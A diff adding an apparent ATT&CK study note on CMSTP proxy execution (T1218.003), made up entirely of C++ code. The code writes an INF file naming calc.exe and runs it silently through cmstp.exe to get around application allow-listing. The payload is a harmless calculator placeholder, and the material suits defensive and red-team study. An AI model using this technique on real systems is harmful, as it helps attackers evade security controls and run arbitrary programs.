@@ -1,0 +1,48 @@
+---
+title: ".003.CMSTP"
+folder: "07. Defense Evasion/T1218 System Binary Proxy Execution "
+---
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+
+
+void inf() {
+    std::ofstream destinationFile("C:\\Users\\User\\Desktop\\test.inf");
+
+    if (!destinationFile.is_open()) {
+        std::cerr << "Nie udało się otworzyć pliku do zapisu.\n";
+        return;
+    } 
+      
+    destinationFile << "[version]\n";
+    destinationFile << "Signature=$chicago$\n";
+    destinationFile << "AdvancedINF=2.5\n";
+    destinationFile << "\n";
+    destinationFile << "[DefaultInstall_SingleUser]\n";
+    destinationFile << "UnRegisterOCXs=UnRegisterOCXSection\n";
+    destinationFile << "\n";
+    destinationFile << "[UnRegisterOCXSection]\n";
+    destinationFile << "C:\\Windows\\System32\\calc.exe\n";
+    destinationFile << "\n";
+    destinationFile << "[Strings]";
+    destinationFile << "AppAct = \"SOFTWARE\\Microsoft\\Connection Manager\"\n";
+    destinationFile << "ServiceName=\" \"\n";
+    destinationFile << "ShortSvcName=\" \"\n";
+
+    destinationFile.close();
+}
+void AutorunRegistryBackground4() {
+    
+    WinExec("cmd.exe /c \"cmstp.exe /s C:\\Users\\User\\Desktop\\test.inf\"", 1);
+      
+}
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    inf();
+    AutorunRegistryBackground4(); 
+    return 0;
+} 
